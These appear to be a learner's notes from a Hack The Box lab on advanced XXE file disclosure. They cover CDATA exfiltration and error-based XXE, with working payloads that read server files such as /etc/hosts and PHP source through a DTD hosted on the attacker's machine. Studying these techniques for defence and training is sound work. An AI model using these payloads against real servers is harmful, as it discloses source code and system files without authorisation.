---
description: >-
  Some file formats may not be readable through basic XXE, while in other cases,
  the web application may not output any input values in some instances
---

# Advanced File Disclosure

## Advanced Exfiltration with CDATA

As discussed in [local-file-disclosure.md](local-file-disclosure.md "mention") we can use PHP filters to encode PHP source files to not break XML format.

For other Web Application we can use CDATA tag to extract data for any web application backend. Using this tag (`<![CDATA[ FILE_CONTENT ]]>`) the XML parser will think that it is raw data and contain any type of data

Steps:

1. define `begin` internal entity with `<![CDATA[`
2. define `end` internal entity with `]]>`
3. place external entitiy file in between

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

<mark style="color:red;">**This will not work since XML prevents joining internal and external entities**</mark>

if we reference `XML Parameter Entities (starts with %)` from an external source (e.g., our own server), then all of them would be considered as external and can be joined

```xml
<!ENTITY joined "%begin;%file;%end;">
```

**Attack machine**

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

**Request body**

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg" alt=""><figcaption><p>view info without encode to base64</p></figcaption></figure>

## Error Based XXE

`Semi blind XXE` -> web application might not write any output, so we cannot control any of the XML input entities to write its content

We can use runtime errors (PHP errors) or exception to display the info.

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg" alt=""><figcaption><p>Send malformed XML</p></figcaption></figure>

we can delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity

The web app displayed errorand revealed web server directory.&#x20;

To exploit we host DTD that contains

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

payload defines the `file` parameter entity and then joins it with an entity that does not exist.

the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error

**call our external DTD script, and then reference the `error` entity**

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg" alt=""><figcaption><p>got the contents in error</p></figcaption></figure>

**this method is not as reliabl**e as the previous method for reading source files, as **it may have length limitations**, and certain **special characters may still break it**.

## Assessment

Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.14.5:8000/xxe.dtd">
  %xxe;
]>
<root>
<name></name>
<tel></tel>
<email>&joined;</email>
<message></message>
</root>
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

